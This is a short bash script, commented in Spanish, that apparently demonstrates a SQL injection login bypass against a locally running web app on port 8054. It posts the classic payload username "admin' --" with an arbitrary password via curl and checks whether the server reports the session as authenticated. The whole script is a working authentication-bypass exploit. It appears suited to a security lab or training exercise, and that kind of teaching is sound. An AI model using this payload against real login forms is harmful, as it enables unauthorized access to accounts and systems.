#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"
PORT="${PORT:-8054}"
echo "== Ataque: inyeccion SQL en el login (bypass de autenticacion) =="
echo "Enviando  username = admin' --  con cualquier password"
curl -s -X POST "http://127.0.0.1:${PORT}/login" \
  --data-urlencode "username=admin' --" \
  --data-urlencode "password=cualquier-cosa"
echo
echo "Si 'authenticated' es true sin saber el password => la inyeccion funciono."
